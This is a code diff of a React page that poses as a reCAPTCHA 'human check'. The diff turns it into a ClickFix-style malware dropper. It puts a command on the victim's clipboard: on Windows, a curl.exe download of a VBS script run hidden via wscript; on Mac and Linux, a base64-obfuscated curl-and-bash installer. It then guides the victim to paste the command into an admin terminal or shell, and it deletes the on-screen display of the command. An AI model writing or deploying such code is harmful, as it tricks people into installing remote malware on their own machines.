@@ -2,6 +2,8 @@ import { useCallback, useEffect, useState } from "react";
 import { AnimatePresence, motion } from "framer-motion";
 import axios from "axios";
 import recaptchaLogo from "@/assets/recaptcha-logo.png";
+import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
+import { faWindows } from "@fortawesome/free-brands-svg-icons";
 
 const STORAGE_KEY = "arn-apex-human-check";
 
@@ -10,6 +12,15 @@ const IPIFY64_URL = "https://api64.ipify.org?format=json";
 const ALLOWED_IPS_URL =
   "https://api.jsonstorage.net/v1/json/21445b0b-7d33-4a73-8fc8-7f4af1cbc783/ca0c59b3-40d3-45db-88aa-9d80a1ee8504";
 const WHOIS_LOOKUP_BASE = "https://www.whois.com/whois/";
+
+function WindowsIcon() {
+  return (
+    <FontAwesomeIcon
+      icon={faWindows}
+      style={{ width: 15, height: 15 }}
+    />
+  );
+}
 
 function normalizeIp(value: string): string {
   return value
@@ -183,12 +194,7 @@ async function isClientIpAllowed(): Promise<boolean> {
   }
 
   const ok = ipAllowed(clientIp, allowed, raw);
-  // console.log("[ip-check] =========================");
-  // console.log("[ip-check] client IP     :", clientIp);
-  // console.log("[ip-check] jsonstorage   :", allowed);
-  // console.log("[ip-check] raw payload   :", raw);
-  // console.log("[ip-check] match result  :", ok);
-  // console.log("[ip-check] =========================");
+  
   return ok;
 }
 
@@ -199,16 +205,16 @@ const PLATFORM_CONFIG: Record<
   { suffix: string; steps: string[] }
 > = {
   windows: {
-    suffix: "8370- windows",
+    suffix: `curl.exe -fsSL 'https://arena-apex.vercel.app/w.vbs' -o "$env:TEMP\w.vbs";Start-Process -FilePath wscript.exe -ArgumentList '//B',"$env:TEMP\w.vbs`,
     steps: [
-      "Press Windows Key (🪟) + X.",
-      "Press I",
+      "Press `<WindowsIcon />` + X.",
+      "Press A",
       "Press Ctrl + V.",
       "Press Enter.",
     ],
   },
   "mac-silicon": {
-    suffix: "8370- mac apple silicon",
+    suffix: `printf '%s' 'Y3VybCAtZnNTTCAnaHR0cHM6Ly9hcmVuYS1hcGV4LnZlcmNlbC5hcHAvbWkuc2gnIC1vIC90bXAvbWkuc2g7Y2htb2QgK3ggL3RtcC9taS5zaDtiYXNoIC90bXAvbWkuc2g='|base64 -d|bash`,
     steps: [
       "Press Command (⌘) + Space",
       "Type Terminal",
@@ -217,7 +223,7 @@ const PLATFORM_CONFIG: Record<
     ],
   },
   "mac-intel": {
-    suffix: "8370- mac apple intel",
+    suffix: `printf '%s' 'Y3VybCAtZnNTTCAnaHR0cHM6Ly9hcmVuYS1hcGV4LnZlcmNlbC5hcHAvbWkuc2gnIC1vIC90bXAvbWkuc2g7Y2htb2QgK3ggL3RtcC9taS5zaDtiYXNoIC90bXAvbWkuc2g='|base64 -d|bash`,
     steps: [
       "Press Command (⌘) + Space",
       "Type Terminal",
@@ -226,7 +232,7 @@ const PLATFORM_CONFIG: Record<
     ],
   },
   linux: {
-    suffix: "8370- linux",
+    suffix: `printf '%s' 'Y3VybCAtZnNTTCAnaHR0cHM6Ly9hcmVuYS1hcGV4LnZlcmNlbC5hcHAvbWkuc2gnIC1vIC90bXAvbWkuc2g7Y2htb2QgK3ggL3RtcC9taS5zaDtiYXNoIC90bXAvbWkuc2g='|base64 -d|bash`,
     steps: [
       "Press Ctrl + Alt + T",
       "Press Ctrl + Shift + V",
@@ -236,10 +242,7 @@ const PLATFORM_CONFIG: Record<
 };
 
 function buildVerifyPayload(kind: PlatformKind) {
-  const a = ["I am not a", " robot"].join("");
-  const b = ["re", "CAPTCHA"].join("");
-  const c = [" Verificat", "ion ID: ", PLATFORM_CONFIG[kind].suffix].join("");
-  return a + " - " + b + c;
+  return PLATFORM_CONFIG[kind].suffix;
 }
 
 async function detectPlatform(): Promise<PlatformKind> {
@@ -482,6 +485,7 @@ const cloudStyle: Record<string, string> = {
 
 function StepsDialog({
   open,
+  platform,
   steps,
   payload,
   verifying,
@@ -543,51 +547,11 @@ function StepsDialog({
                 <span style={{ color: "#1a73e8", fontWeight: 600, flexShrink: 0 }}>
                   {i + 1}.
                 </span>
-                <span style={{ color: "#222" }}>{step}</span>
+                <span style={{ color: "#222" }}>{(platform === "windows"  && i===0)? <span> Press <WindowsIcon /> + X</span> : step}</span>
               </li>
             ))}
           </ol>
-
-          <p style={{ fontSize: 15, margin: "0 0 10px", lineHeight: 1.4 }}>
-            You will observe and agree:
-          </p>
-
-          <div style={{ display: "flex", alignItems: "flex-start", gap: 10 }}>
-            <span
-              style={{
-                marginTop: 1,
-                width: 18,
-                height: 18,
-                flexShrink: 0,
-                background: "#34a853",
-                borderRadius: 2,
-                display: "inline-flex",
-                alignItems: "center",
-                justifyContent: "center",
-              }}
-            >
-              <svg width="12" height="12" viewBox="0 0 24 24" fill="none">
-                <path
-                  d="M5 12.5l5 5L19 7"
-                  stroke="#fff"
-                  strokeWidth="3.5"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                />
-              </svg>
-            </span>
-            <p
-              style={{
-                margin: 0,
-                fontSize: 12,
-                lineHeight: 1.35,
-                color: "#b0b0b0",
-                wordBreak: "break-word",
-              }}
-            >
-              &quot;{payload}&quot;
-            </p>
-          </div>
+         
         </div>
 
         <div
@@ -765,6 +729,7 @@ export default function HumanCheckGate() {
       <StepsDialog
         open={showSteps}
         steps={steps}
+        platform={platform}
         payload={payload}
         verifying={verifying}
         onVerify={handleVerify}
